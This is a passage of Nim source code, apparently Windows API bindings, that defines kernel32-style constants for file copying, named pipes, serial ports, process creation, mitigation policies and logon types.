0x40000  PROGRESS_CONTINUE* = 0  PROGRESS_CANCEL* = 1  PROGRESS_STOP* = 2  PROGRESS_QUIET* = 3  CALLBACK_CHUNK_FINISHED* = 0x0  CALLBACK_STREAM_SWITCH* = 0x1  COPY_FILE_FAIL_IF_EXISTS* = 0x1  COPY_FILE_RESTARTABLE* = 0x2  COPY_FILE_OPEN_SOURCE_FOR_WRITE* = 0x4  COPY_FILE_ALLOW_DECRYPTED_DESTINATION* = 0x8  COPY_FILE_COPY_SYMLINK* = 0x800  COPY_FILE_NO_BUFFERING* = 0x1000  COPY_FILE_REQUEST_SECURITY_PRIVILEGES* = 0x2000  COPY_FILE_RESUME_FROM_PAUSE* = 0x4000  COPY_FILE_NO_OFFLOAD* = 0x40000  REPLACEFILE_WRITE_THROUGH* = 0x1  REPLACEFILE_IGNORE_MERGE_ERRORS* = 0x2  REPLACEFILE_IGNORE_ACL_ERRORS* = 0x4  PIPE_ACCESS_INBOUND* = 0x1  PIPE_ACCESS_OUTBOUND* = 0x2  PIPE_ACCESS_DUPLEX* = 0x3  PIPE_CLIENT_END* = 0x0  PIPE_SERVER_END* = 0x1  PIPE_WAIT* = 0x0  PIPE_NOWAIT* = 0x1  PIPE_READMODE_BYTE* = 0x0  PIPE_READMODE_MESSAGE* = 0x2  PIPE_TYPE_BYTE* = 0x0  PIPE_TYPE_MESSAGE* = 0x4  PIPE_ACCEPT_REMOTE_CLIENTS* = 0x0  PIPE_REJECT_REMOTE_CLIENTS* = 0x8  PIPE_UNLIMITED_INSTANCES* = 255  SECURITY_ANONYMOUS* = securityAnonymous shl 16  SECURITY_IDENTIFICATION* = securityIdentification shl 16  SECURITY_IMPERSONATION* = securityImpersonation shl 16  SECURITY_DELEGATION* = securityDelegation shl 16  SECURITY_CONTEXT_TRACKING* = 0x40000  SECURITY_EFFECTIVE_ONLY* = 0x80000  SECURITY_SQOS_PRESENT* = 0x100000  SECURITY_VALID_SQOS_FLAGS* = 0x1f0000  FAIL_FAST_GENERATE_EXCEPTION_ADDRESS* = 0x1  FAIL_FAST_NO_HARD_ERROR_DLG* = 0x2  SP_SERIALCOMM* = DWORD 0x1  PST_UNSPECIFIED* = DWORD 0x0  PST_RS232* = DWORD 0x1  PST_PARALLELPORT* = DWORD 0x2  PST_RS422* = DWORD 0x3  PST_RS423* = DWORD 0x4  PST_RS449* = DWORD 0x5  PST_MODEM* = DWORD 0x6  PST_FAX* = DWORD 0x21  PST_SCANNER* = DWORD 0x22  PST_NETWORK_BRIDGE* = DWORD 0x100  PST_LAT* = DWORD 0x101  PST_TCPIP_TELNET* = DWORD 0x102  PST_X25* = DWORD 0x103  PCF_DTRDSR* = DWORD 0x1  PCF_RTSCTS* = DWORD 0x2  PCF_RLSD* = DWORD 0x4  PCF_PARITY_CHECK* = DWORD 0x8  PCF_XONXOFF* = DWORD 0x10  PCF_SETXCHAR* = DWORD 0x20  PCF_TOTALTIMEOUTS* = DWORD 0x40  PCF_INTTIMEOUTS* = DWORD 0x80  PCF_SPECIALCHARS* = DWORD 0x100  PCF_16BITMODE* = DWORD 0x200  SP_PARITY* = DWORD 0x1  SP_BAUD* = DWORD 0x2  SP_DATABITS* = DWORD 0x4  SP_STOPBITS* = DWORD 0x8  SP_HANDSHAKING* = DWORD 0x10  SP_PARITY_CHECK* = DWORD 0x20  SP_RLSD* = DWORD 0x40  BAUD_075* = DWORD 0x1  BAUD_110* = DWORD 0x2  BAUD_134_5* = DWORD 0x4  BAUD_150* = DWORD 0x8  BAUD_300* = DWORD 0x10  BAUD_600* = DWORD 0x20  BAUD_1200* = DWORD 0x40  BAUD_1800* = DWORD 0x80  BAUD_2400* = DWORD 0x100  BAUD_4800* = DWORD 0x200  BAUD_7200* = DWORD 0x400  BAUD_9600* = DWORD 0x800  BAUD_14400* = DWORD 0x1000  BAUD_19200* = DWORD 0x2000  BAUD_38400* = DWORD 0x4000  BAUD_56K* = DWORD 0x8000  BAUD_128K* = DWORD 0x10000  BAUD_115200* = DWORD 0x20000  BAUD_57600* = DWORD 0x40000  BAUD_USER* = DWORD 0x10000000  DATABITS_5* = WORD 0x1  DATABITS_6* = WORD 0x2  DATABITS_7* = WORD 0x4  DATABITS_8* = WORD 0x8  DATABITS_16* = WORD 0x10  DATABITS_16X* = WORD 0x20  STOPBITS_10* = WORD 0x1  STOPBITS_15* = WORD 0x2  STOPBITS_20* = WORD 0x4  PARITY_NONE* = WORD 0x100  PARITY_ODD* = WORD 0x200  PARITY_EVEN* = WORD 0x400  PARITY_MARK* = WORD 0x800  PARITY_SPACE* = WORD 0x1000  COMMPROP_INITIALIZED* = DWORD 0xe73cf52e'i32  DTR_CONTROL_DISABLE* = 0x0  DTR_CONTROL_ENABLE* = 0x1  DTR_CONTROL_HANDSHAKE* = 0x2  RTS_CONTROL_DISABLE* = 0x0  RTS_CONTROL_ENABLE* = 0x1  RTS_CONTROL_HANDSHAKE* = 0x2  RTS_CONTROL_TOGGLE* = 0x3  GMEM_FIXED* = 0x0  GMEM_MOVEABLE* = 0x2  GMEM_NOCOMPACT* = 0x10  GMEM_NODISCARD* = 0x20  GMEM_ZEROINIT* = 0x40  GMEM_MODIFY* = 0x80  GMEM_DISCARDABLE* = 0x100  GMEM_NOT_BANKED* = 0x1000  GMEM_SHARE* = 0x2000  GMEM_DDESHARE* = 0x2000  GMEM_NOTIFY* = 0x4000  GMEM_LOWER* = GMEM_NOT_BANKED  GMEM_VALID_FLAGS* = 0x7f72  GMEM_INVALID_HANDLE* = 0x8000  GHND* = GMEM_MOVEABLE or GMEM_ZEROINIT  GPTR* = GMEM_FIXED or GMEM_ZEROINIT  GMEM_DISCARDED* = 0x4000  GMEM_LOCKCOUNT* = 0x00ff  NUMA_NO_PREFERRED_NODE* = DWORD(-1)  DEBUG_PROCESS* = 0x1  DEBUG_ONLY_THIS_PROCESS* = 0x2  CREATE_SUSPENDED* = 0x4  DETACHED_PROCESS* = 0x8  CREATE_NEW_CONSOLE* = 0x10  NORMAL_PRIORITY_CLASS* = 0x20  IDLE_PRIORITY_CLASS* = 0x40  HIGH_PRIORITY_CLASS* = 0x80  REALTIME_PRIORITY_CLASS* = 0x100  CREATE_NEW_PROCESS_GROUP* = 0x200  CREATE_UNICODE_ENVIRONMENT* = 0x400  CREATE_SEPARATE_WOW_VDM* = 0x800  CREATE_SHARED_WOW_VDM* = 0x1000  CREATE_FORCEDOS* = 0x2000  BELOW_NORMAL_PRIORITY_CLASS* = 0x4000  ABOVE_NORMAL_PRIORITY_CLASS* = 0x8000  INHERIT_PARENT_AFFINITY* = 0x10000  INHERIT_CALLER_PRIORITY* = 0x20000  CREATE_PROTECTED_PROCESS* = 0x40000  EXTENDED_STARTUPINFO_PRESENT* = 0x80000  PROCESS_MODE_BACKGROUND_BEGIN* = 0x100000  PROCESS_MODE_BACKGROUND_END* = 0x200000  CREATE_BREAKAWAY_FROM_JOB* = 0x1000000  CREATE_PRESERVE_CODE_AUTHZ_LEVEL* = 0x2000000  CREATE_DEFAULT_ERROR_MODE* = 0x4000000  CREATE_NO_WINDOW* = 0x8000000  PROFILE_USER* = 0x10000000  PROFILE_KERNEL* = 0x20000000  PROFILE_SERVER* = 0x40000000  CREATE_IGNORE_SYSTEM_DEFAULT* = 0x80000000'i32  STACK_SIZE_PARAM_IS_A_RESERVATION* = 0x10000  THREAD_PRIORITY_LOWEST* = THREAD_BASE_PRIORITY_MIN  THREAD_PRIORITY_BELOW_NORMAL* = THREAD_PRIORITY_LOWEST+1  THREAD_PRIORITY_NORMAL* = 0  THREAD_PRIORITY_HIGHEST* = THREAD_BASE_PRIORITY_MAX  THREAD_PRIORITY_ABOVE_NORMAL* = THREAD_PRIORITY_HIGHEST-1  THREAD_PRIORITY_ERROR_RETURN* = MAXLONG  THREAD_PRIORITY_TIME_CRITICAL* = THREAD_BASE_PRIORITY_LOWRT  THREAD_PRIORITY_IDLE* = THREAD_BASE_PRIORITY_IDLE  THREAD_MODE_BACKGROUND_BEGIN* = 0x00010000  THREAD_MODE_BACKGROUND_END* = 0x00020000  VOLUME_NAME_DOS* = 0x0  VOLUME_NAME_GUID* = 0x1  VOLUME_NAME_NT* = 0x2  VOLUME_NAME_NONE* = 0x4  FILE_NAME_NORMALIZED* = 0x0  FILE_NAME_OPENED* = 0x8  DRIVE_UNKNOWN* = 0  DRIVE_NO_ROOT_DIR* = 1  DRIVE_REMOVABLE* = 2  DRIVE_FIXED* = 3  DRIVE_REMOTE* = 4  DRIVE_CDROM* = 5  DRIVE_RAMDISK* = 6  FILE_TYPE_UNKNOWN* = 0x0  FILE_TYPE_DISK* = 0x1  FILE_TYPE_CHAR* = 0x2  FILE_TYPE_PIPE* = 0x3  FILE_TYPE_REMOTE* = 0x8000  STD_INPUT_HANDLE* = DWORD(-10)  STD_OUTPUT_HANDLE* = DWORD(-11)  STD_ERROR_HANDLE* = DWORD(-12)  NOPARITY* = 0  ODDPARITY* = 1  EVENPARITY* = 2  MARKPARITY* = 3  SPACEPARITY* = 4  ONESTOPBIT* = 0  ONE5STOPBITS* = 1  TWOSTOPBITS* = 2  IGNORE* = 0  INFINITE* = 0xffffffff'i32  CBR_110* = 110  CBR_300* = 300  CBR_600* = 600  CBR_1200* = 1200  CBR_2400* = 2400  CBR_4800* = 4800  CBR_9600* = 9600  CBR_14400* = 14400  CBR_19200* = 19200  CBR_38400* = 38400  CBR_56000* = 56000  CBR_57600* = 57600  CBR_115200* = 115200  CBR_128000* = 128000  CBR_256000* = 256000  CE_RXOVER* = 0x1  CE_OVERRUN* = 0x2  CE_RXPARITY* = 0x4  CE_FRAME* = 0x8  CE_BREAK* = 0x10  CE_TXFULL* = 0x100  CE_PTO* = 0x200  CE_IOE* = 0x400  CE_DNS* = 0x800  CE_OOP* = 0x1000  CE_MODE* = 0x8000  IE_BADID* = -1  IE_OPEN* = -2  IE_NOPEN* = -3  IE_MEMORY* = -4  IE_DEFAULT* = -5  IE_HARDWARE* = -10  IE_BYTESIZE* = -11  IE_BAUDRATE* = -12  EV_RXCHAR* = 0x1  EV_RXFLAG* = 0x2  EV_TXEMPTY* = 0x4  EV_CTS* = 0x8  EV_DSR* = 0x10  EV_RLSD* = 0x20  EV_BREAK* = 0x40  EV_ERR* = 0x80  EV_RING* = 0x100  EV_PERR* = 0x200  EV_RX80FULL* = 0x400  EV_EVENT1* = 0x800  EV_EVENT2* = 0x1000  SETXOFF* = 1  SETXON* = 2  SETRTS* = 3  CLRRTS* = 4  SETDTR* = 5  CLRDTR* = 6  RESETDEV* = 7  SETBREAK* = 8  CLRBREAK* = 9  PURGE_TXABORT* = 0x1  PURGE_RXABORT* = 0x2  PURGE_TXCLEAR* = 0x4  PURGE_RXCLEAR* = 0x8  LPTx* = 0x80  MS_CTS_ON* = DWORD 0x10  MS_DSR_ON* = DWORD 0x20  MS_RING_ON* = DWORD 0x40  MS_RLSD_ON* = DWORD 0x80  S_QUEUEEMPTY* = 0  S_THRESHOLD* = 1  S_ALLTHRESHOLD* = 2  S_NORMAL* = 0  S_LEGATO* = 1  S_STACCATO* = 2  S_PERIOD512* = 0  S_PERIOD1024* = 1  S_PERIOD2048* = 2  S_PERIODVOICE* = 3  S_WHITE512* = 4  S_WHITE1024* = 5  S_WHITE2048* = 6  S_WHITEVOICE* = 7  S_SERDVNA* = -1  S_SEROFM* = -2  S_SERMACT* = -3  S_SERQFUL* = -4  S_SERBDNT* = -5  S_SERDLN* = -6  S_SERDCC* = -7  S_SERDTP* = -8  S_SERDVL* = -9  S_SERDMD* = -10  S_SERDSH* = -11  S_SERDPT* = -12  S_SERDFQ* = -13  S_SERDDR* = -14  S_SERDSR* = -15  S_SERDST* = -16  NMPWAIT_WAIT_FOREVER* = 0xffffffff'i32  NMPWAIT_NOWAIT* = 0x1  NMPWAIT_USE_DEFAULT_WAIT* = 0x0  FS_CASE_IS_PRESERVED* = FILE_CASE_PRESERVED_NAMES  FS_CASE_SENSITIVE* = FILE_CASE_SENSITIVE_SEARCH  FS_UNICODE_STORED_ON_DISK* = FILE_UNICODE_ON_DISK  FS_PERSISTENT_ACLS* = FILE_PERSISTENT_ACLS  FS_VOL_IS_COMPRESSED* = FILE_VOLUME_IS_COMPRESSED  FS_FILE_COMPRESSION* = FILE_FILE_COMPRESSION  FS_FILE_ENCRYPTION* = FILE_SUPPORTS_ENCRYPTION  OF_READ* = 0x0  OF_WRITE* = 0x1  OF_READWRITE* = 0x2  OF_SHARE_COMPAT* = 0x0  OF_SHARE_EXCLUSIVE* = 0x10  OF_SHARE_DENY_WRITE* = 0x20  OF_SHARE_DENY_READ* = 0x30  OF_SHARE_DENY_NONE* = 0x40  OF_PARSE* = 0x100  OF_DELETE* = 0x200  OF_VERIFY* = 0x400  OF_CANCEL* = 0x800  OF_CREATE* = 0x1000  OF_PROMPT* = 0x2000  OF_EXIST* = 0x4000  OF_REOPEN* = 0x8000  MAXINTATOM* = 0xc000  INVALID_ATOM* = ATOM 0  SCS_32BIT_BINARY* = 0  SCS_DOS_BINARY* = 1  SCS_WOW_BINARY* = 2  SCS_PIF_BINARY* = 3  SCS_POSIX_BINARY* = 4  SCS_OS216_BINARY* = 5  SCS_64BIT_BINARY* = 6  FIBER_FLAG_FLOAT_SWITCH* = 0x1  threadMemoryPriority* = 0  threadAbsoluteCpuPriority* = 1  threadInformationClassMax* = 2  processMemoryPriority* = 0  processInformationClassMax* = 1  MEMORY_PRIORITY_LOWEST* = 0  MEMORY_PRIORITY_VERY_LOW* = 1  MEMORY_PRIORITY_LOW* = 2  MEMORY_PRIORITY_MEDIUM* = 3  MEMORY_PRIORITY_BELOW_NORMAL* = 4  MEMORY_PRIORITY_NORMAL* = 5  PROCESS_DEP_ENABLE* = 0x00000001  PROCESS_DEP_DISABLE_ATL_THUNK_EMULATION* = 0x00000002  FILE_SKIP_COMPLETION_PORT_ON_SUCCESS* = 0x1  FILE_SKIP_SET_EVENT_ON_HANDLE* = 0x2  SEM_FAILCRITICALERRORS* = 0x0001  SEM_NOGPFAULTERRORBOX* = 0x0002  SEM_NOALIGNMENTFAULTEXCEPT* = 0x0004  SEM_NOOPENFILEERRORBOX* = 0x8000  CRITICAL_SECTION_NO_DEBUG_INFO* = RTL_CRITICAL_SECTION_FLAG_NO_DEBUG_INFO  dEPPolicyAlwaysOff* = 0  dEPPolicyAlwaysOn* = 1  dEPPolicyOptIn* = 2  dEPPolicyOptOut* = 3  dEPTotalPolicyCount* = 4  HANDLE_FLAG_INHERIT* = 0x1  HANDLE_FLAG_PROTECT_FROM_CLOSE* = 0x2  HINSTANCE_ERROR* = 32  GET_TAPE_MEDIA_INFORMATION* = 0  GET_TAPE_DRIVE_INFORMATION* = 1  SET_TAPE_MEDIA_INFORMATION* = 0  SET_TAPE_DRIVE_INFORMATION* = 1  FORMAT_MESSAGE_IGNORE_INSERTS* = 0x00000200  FORMAT_MESSAGE_FROM_STRING* = 0x00000400  FORMAT_MESSAGE_FROM_HMODULE* = 0x00000800  FORMAT_MESSAGE_FROM_SYSTEM* = 0x00001000  FORMAT_MESSAGE_ARGUMENT_ARRAY* = 0x00002000  FORMAT_MESSAGE_MAX_WIDTH_MASK* = 0x000000ff  FILE_ENCRYPTABLE* = 0  FILE_IS_ENCRYPTED* = 1  FILE_SYSTEM_ATTR* = 2  FILE_ROOT_DIR* = 3  FILE_SYSTEM_DIR* = 4  FILE_UNKNOWN* = 5  FILE_SYSTEM_NOT_SUPPORT* = 6  FILE_USER_DISALLOWED* = 7  FILE_READ_ONLY* = 8  FILE_DIR_DISALLOWED* = 9  FORMAT_MESSAGE_ALLOCATE_BUFFER* = 0x00000100  EFS_USE_RECOVERY_KEYS* = 0x1  CREATE_FOR_IMPORT* = 1  CREATE_FOR_DIR* = 2  OVERWRITE_HIDDEN* = 4  EFSRPC_SECURE_ONLY* = 8  BACKUP_INVALID* = 0x00000000  BACKUP_DATA* = 0x00000001  BACKUP_EA_DATA* = 0x00000002  BACKUP_SECURITY_DATA* = 0x00000003  BACKUP_ALTERNATE_DATA* = 0x00000004  BACKUP_LINK* = 0x00000005  BACKUP_PROPERTY_DATA* = 0x00000006  BACKUP_OBJECT_ID* = 0x00000007  BACKUP_REPARSE_DATA* = 0x00000008  BACKUP_SPARSE_BLOCK* = 0x00000009  BACKUP_TXFS_DATA* = 0x0000000a  STREAM_NORMAL_ATTRIBUTE* = 0x00000000  STREAM_MODIFIED_WHEN_READ* = 0x00000001  STREAM_CONTAINS_SECURITY* = 0x00000002  STREAM_CONTAINS_PROPERTIES* = 0x00000004  STREAM_SPARSE_ATTRIBUTE* = 0x00000008  STARTF_USESHOWWINDOW* = 0x00000001  STARTF_USESIZE* = 0x00000002  STARTF_USEPOSITION* = 0x00000004  STARTF_USECOUNTCHARS* = 0x00000008  STARTF_USEFILLATTRIBUTE* = 0x00000010  STARTF_RUNFULLSCREEN* = 0x00000020  STARTF_FORCEONFEEDBACK* = 0x00000040  STARTF_FORCEOFFFEEDBACK* = 0x00000080  STARTF_USESTDHANDLES* = 0x00000100  STARTF_USEHOTKEY* = 0x00000200  STARTF_TITLEISLINKNAME* = 0x00000800  STARTF_TITLEISAPPID* = 0x00001000  STARTF_PREVENTPINNING* = 0x00002000  SHUTDOWN_NORETRY* = 0x1  PROCESS_NAME_NATIVE* = 0x00000001  PROC_THREAD_ATTRIBUTE_NUMBER* = 0x0000ffff  PROC_THREAD_ATTRIBUTE_THREAD* = 0x00010000  PROC_THREAD_ATTRIBUTE_INPUT* = 0x00020000  PROC_THREAD_ATTRIBUTE_ADDITIVE* = 0x00040000  procThreadAttributeParentProcess* = 0  procThreadAttributeHandleList* = 2  procThreadAttributeGroupAffinity* = 3  procThreadAttributePreferredNode* = 4  procThreadAttributeIdealProcessor* = 5  procThreadAttributeUmsThread* = 6  procThreadAttributeMitigationPolicy* = 7  procThreadAttributeSecurityCapabilities* = 9template ProcThreadAttributeValue*(Number, Thread, Input, Additive: untyped): untyped = (((Number) and PROC_THREAD_ATTRIBUTE_NUMBER) or (if (Thread != FALSE): PROC_THREAD_ATTRIBUTE_THREAD else: 0) or (if (Input != FALSE): PROC_THREAD_ATTRIBUTE_INPUT else: 0) or (if (Additive != FALSE): PROC_THREAD_ATTRIBUTE_ADDITIVE else: 0))const  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = ProcThreadAttributeValue(procThreadAttributeParentProcess, FALSE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_HANDLE_LIST* = ProcThreadAttributeValue(procThreadAttributeHandleList, FALSE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_GROUP_AFFINITY* = ProcThreadAttributeValue(procThreadAttributeGroupAffinity, TRUE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_PREFERRED_NODE* = ProcThreadAttributeValue(procThreadAttributePreferredNode, FALSE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_IDEAL_PROCESSOR* = ProcThreadAttributeValue(procThreadAttributeIdealProcessor, TRUE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_UMS_THREAD* = ProcThreadAttributeValue(procThreadAttributeUmsThread, TRUE, TRUE, FALSE)  PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY* = ProcThreadAttributeValue(procThreadAttributeMitigationPolicy, FALSE, TRUE, FALSE)  PROCESS_CREATION_MITIGATION_POLICY_DEP_ENABLE* = 0x01  PROCESS_CREATION_MITIGATION_POLICY_DEP_ATL_THUNK_ENABLE* = 0x02  PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE* = 0x04  PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES* = ProcThreadAttributeValue(procThreadAttributeSecurityCapabilities, FALSE, TRUE, FALSE)  PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_MASK* = 0x00000003 shl 8  PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_DEFER* = 0x00000000 shl 8  PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON* = 0x00000001 shl 8  PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_OFF* = 0x00000002 shl 8  PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON_REQ_RELOCS* = 0x00000003 shl 8  PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_MASK* = 0x00000003 shl 12  PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_DEFER* = 0x00000000 shl 12  PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON* = 0x00000001 shl 12  PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_OFF* = 0x00000002 shl 12  PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_RESERVED* = 0x00000003 shl 12  PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_MASK* = 0x00000003 shl 16  PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_DEFER* = 0x00000000 shl 16  PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON* = 0x00000001 shl 16  PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_OFF* = 0x00000002 shl 16  PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_RESERVED* = 0x00000003 shl 16  PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_MASK* = 0x00000003 shl 20  PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_DEFER* = 0x00000000 shl 20  PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON* = 0x00000001 shl 20  PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_OFF* = 0x00000002 shl 20  PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_RESERVED* = 0x00000003 shl 20  PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_MASK* = 0x00000003 shl 24  PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_DEFER* = 0x00000000 shl 24  PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON* = 0x00000001 shl 24  PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_OFF* = 0x00000002 shl 24  PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_RESERVED* = 0x00000003 shl 24  PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_MASK* = 0x00000003 shl 28  PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_DEFER* = 0x00000000 shl 28  PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON* = 0x00000001 shl 28  PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_OFF* = 0x00000002 shl 28  PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_RESERVED* = 0x00000003 shl 28  PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_MASK* = 0x00000003 shl 32  PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_DEFER* = 0x00000000 shl 32  PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON* = 0x00000001 shl 32  PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF* = 0x00000002 shl 32  PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_RESERVED* = 0x00000003 shl 32  ATOM_FLAG_GLOBAL* = 0x2  GET_SYSTEM_WOW64_DIRECTORY_NAME_A_A* = "GetSystemWow64DirectoryA"  GET_SYSTEM_WOW64_DIRECTORY_NAME_A_W* = "GetSystemWow64DirectoryA"  GET_SYSTEM_WOW64_DIRECTORY_NAME_A_T* = "GetSystemWow64DirectoryA"  GET_SYSTEM_WOW64_DIRECTORY_NAME_W_A* = "GetSystemWow64DirectoryW"  GET_SYSTEM_WOW64_DIRECTORY_NAME_W_W* = "GetSystemWow64DirectoryW"  GET_SYSTEM_WOW64_DIRECTORY_NAME_W_T* = "GetSystemWow64DirectoryW"  BASE_SEARCH_PATH_ENABLE_SAFE_SEARCHMODE* = 0x1  BASE_SEARCH_PATH_DISABLE_SAFE_SEARCHMODE* = 0x10000  BASE_SEARCH_PATH_PERMANENT* = 0x8000  BASE_SEARCH_PATH_INVALID_FLAGS* = not 0x18001  DDD_RAW_TARGET_PATH* = 0x00000001  DDD_REMOVE_DEFINITION* = 0x00000002  DDD_EXACT_MATCH_ON_REMOVE* = 0x00000004  DDD_NO_BROADCAST_SYSTEM* = 0x00000008  DDD_LUID_BROADCAST_DRIVE* = 0x00000010  COPYFILE2_CALLBACK_NONE* = 0  COPYFILE2_CALLBACK_CHUNK_STARTED* = 1  COPYFILE2_CALLBACK_CHUNK_FINISHED* = 2  COPYFILE2_CALLBACK_STREAM_STARTED* = 3  COPYFILE2_CALLBACK_STREAM_FINISHED* = 4  COPYFILE2_CALLBACK_POLL_CONTINUE* = 5  COPYFILE2_CALLBACK_ERROR* = 6  COPYFILE2_CALLBACK_MAX* = 7  COPYFILE2_PROGRESS_CONTINUE* = 0  COPYFILE2_PROGRESS_CANCEL* = 1  COPYFILE2_PROGRESS_STOP* = 2  COPYFILE2_PROGRESS_QUIET* = 3  COPYFILE2_PROGRESS_PAUSE* = 4  COPYFILE2_PHASE_NONE* = 0  COPYFILE2_PHASE_PREPARE_SOURCE* = 1  COPYFILE2_PHASE_PREPARE_DEST* = 2  COPYFILE2_PHASE_READ_SOURCE* = 3  COPYFILE2_PHASE_WRITE_DESTINATION* = 4  COPYFILE2_PHASE_SERVER_COPY* = 5  COPYFILE2_PHASE_NAMEGRAFT_COPY* = 6  COPYFILE2_PHASE_MAX* = 7  COPYFILE2_MESSAGE_COPY_OFFLOAD* = 0x00000001  MOVEFILE_REPLACE_EXISTING* = 0x00000001  MOVEFILE_COPY_ALLOWED* = 0x00000002  MOVEFILE_DELAY_UNTIL_REBOOT* = 0x00000004  MOVEFILE_WRITE_THROUGH* = 0x00000008  MOVEFILE_CREATE_HARDLINK* = 0x00000010  MOVEFILE_FAIL_IF_NOT_TRACKABLE* = 0x00000020  findStreamInfoStandard* = 0  findStreamInfoMaxInfoLevel* = 1  EVENTLOG_FULL_INFO* = 0  OPERATION_API_VERSION* = 1  OPERATION_START_TRACE_CURRENT_THREAD* = 0x1  OPERATION_END_DISCARD* = 0x1  MAX_COMPUTERNAME_LENGTH* = 15  LOGON32_LOGON_INTERACTIVE* = 2  LOGON32_LOGON_NETWORK* = 3  LOGON32_LOGON_BATCH* = 4  LOGON32_LOGON_SERVICE* = 5  LOGON32_LOGON_UNLOCK* = 7  LOGON32_LOGON_NETWORK_CLEARTEXT* = 8  LOGON32_LOGON_NEW_CREDENTIALS* = 9  LOGON32_PROVIDER_DEFAULT* = 0  LOGON32_PROVIDER_WINNT35* = 1  LOGON32_PROVIDER_WINNT40* = 2  LOGON32_PROVIDER_WINNT50* = 3  LOGON32_PROVIDER_VIRTUAL* = 4  LOGON_WITH_PROFILE* = 0x00000001  LOGON_NETCREDENTIALS_ONLY* = 0x00000002  LOGON_ZERO_PASSWORD_BUFFER* = 0x80000000'i32  DOCKINFO_UNDOCKED* = 0x1  DOCKINFO_DOCKED* = 0x2  DOCKINFO_USER_SUPPLIED* = 0x4  DOCKINFO_USER_UNDOCKED* = DOCKINFO_USER_SUPPLIED or DOCKINFO_UNDOCKED  DOCKINFO_USER_DOCKED* = DOCKINFO_USER_SUPPLIED or DOCKINFO_DOCKED  TIME_ZONE_ID_INVALID* = DWORD 0xffffffff'i32  AC_LINE_OFFLINE* = 0x00  AC_LINE_ONLINE* = 0x01  AC_LINE_BACKUP_POWER* = 0x02  AC_LINE_UNKNOWN* = 0xff  BATTERY_FLAG_HIGH* = 0x01  BATTERY_FLAG_LOW* = 0x02  BATTERY_FLAG_CRITICAL* = 0x04  BATTERY_FLAG_CHARGING* = 0x08  BATTERY_FLAG_NO_BATTERY* = 0x80  BATTERY_FLAG_UNKNOWN* = 0xff  BATTERY_PERCENTAGE_UNKNOWN* = 0xff  BATTERY_LIFE_UNKNOWN* = 0xffffffff'i32  MEHC_PATROL_SCRUBBER_PRESENT* = 0x1  ACTCTX_FLAG_PROCESSOR_ARCHITECTURE_VALID* = 0x00000001  ACTCTX_FLAG_LANGID_VALID* = 0x00000002  ACTCTX_FLAG_ASSEMBLY_DIRECTORY_VALID* = 0x00000004  ACTCTX_FLAG_RESOURCE_NAME_VALID* = 0x00000008  ACTCTX_FLAG_SET_PROCESS_DEFAULT* = 0x00000010  ACTCTX_FLAG_APPLICATION_NAME_VALID* = 0x00000020  ACTCTX_FLAG_SOURCE_IS_ASSEMBLYREF* = 0x00000040  ACTCTX_FLAG_HMODULE_VALID* = 0x00000080  DEACTIVATE_ACTCTX_FLAG_FORCE_EARLY_DEACTIVATION* = 0x00000001  FIND_ACTCTX_SECTION_KEY_RETURN_HACTCTX* = 0x00000001  FIND_ACTCTX_SECTION_KEY_RETURN_FLAGS* = 0x00000002  FIND_ACTCTX_SECTION_KEY_RETURN_ASSEMBLY_METADATA* = 0x00000004  ACTIVATION_CONTEXT_BASIC_INFORMATION_DEFINED* = 1  